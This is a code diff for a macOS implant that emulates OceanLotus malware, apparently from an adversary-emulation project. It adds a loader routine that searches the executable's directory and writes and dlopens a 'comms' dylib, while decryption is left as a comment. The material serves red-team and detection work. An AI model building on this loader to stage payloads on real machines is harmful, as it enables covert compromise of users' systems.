@@ -1,6 +1,7 @@
 #include <iostream>
 #include <vector>
 #include <dlfcn.h>
+#include <dirent.h>
 
 #include <mach-o/dyld.h>
 
@@ -35,19 +36,6 @@ std::string getPathToExecutable() {
 }
 
 /*
-dropComms
-    About:
-        Writes the embedded libComms.dylib to the path to the executable
-    Result:
-    MITRE ATT&CK Techniques:
-    CTI:
-    References:
-*/
-void dropComms(std::string exePath) {
-    return;
-}
-
-/*
 loadComms
     About:
         Responsible for finding, decrypting and loading the libComms dylib.
@@ -58,16 +46,53 @@ loadComms
         https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
     References:
         https://stackoverflow.com/q/43184544
+        https://stackoverflow.com/a/75193598
         https://tldp.org/HOWTO/C++-dlopen/thesolution.html
 */
-void* loadComms(std::string exePath) {
-    // for each file in exePath (path to executable):
-    //      try:
-    //          decrypt file and output to /tmp/store
-    //      catch:
-    //          pass (ignore failures)
+void* loadComms(std::string exePath, std::string self) {
+    bool dylibLoaded = false;
+    void* dylib = NULL;
+    DIR* directory = NULL;
+    if ((directory = opendir(exePath.c_str())) == NULL) {
+        std::cout << "[IMPLANT] Can't open " + exePath << std::endl;
+        return dylib;
+    }
 
-    return dlopen(PATH_TO_COMMS_LIB, RTLD_LAZY);
+    struct dirent* entry = NULL;
+    while ((entry = readdir(directory)) != NULL) {
+        char full_name[512] = { 0 };
+        snprintf(full_name, 512, "%s%s", exePath.c_str(), entry->d_name);
+
+        if (entry->d_type == DT_DIR) {
+            std::cout << "[IMPLANT] Skipping directory in search for Comms file..." << std::endl;
+        } else if (full_name == self){
+            continue;
+        } else {
+            std::vector<unsigned char> fileBytes = client::readFile(full_name);
+            try {
+
+                //     decrypt file and output to /tmp/store
+
+                bool fileWritten = client::writeFile(fileBytes, std::string(PATH_TO_COMMS_LIB));
+                if (fileWritten) {
+                    dylib = dlopen(PATH_TO_COMMS_LIB, RTLD_LAZY);
+                    if (dylib != NULL) {
+                        dylibLoaded = true;
+                    }
+                }
+            }
+            catch(...) {
+                // pass (ignore failures)    
+            }
+        }
+        if (dylibLoaded) {
+            break;
+        }
+
+    }
+    closedir(directory);
+
+    return dylib;
 }
 
 int main(int argc, const char * argv[]) {
@@ -76,11 +101,10 @@ int main(int argc, const char * argv[]) {
 
     client.pathProcess = getPathToExecutable();
 
-    // drop embedded libComms.dylib to cwd
-    dropComms(client.pathProcess);
-
     // load libComms.dylib
-    client.dylib = loadComms(client.pathProcess);
+    client.dylib = loadComms(client.pathProcess, argv[0]);
+
+    std::cout << "[IMPLANT] Executing process name is: " + std::string(argv[0]) << std::endl;
 
     // check libComms was opened
     if (client.dylib == NULL) {
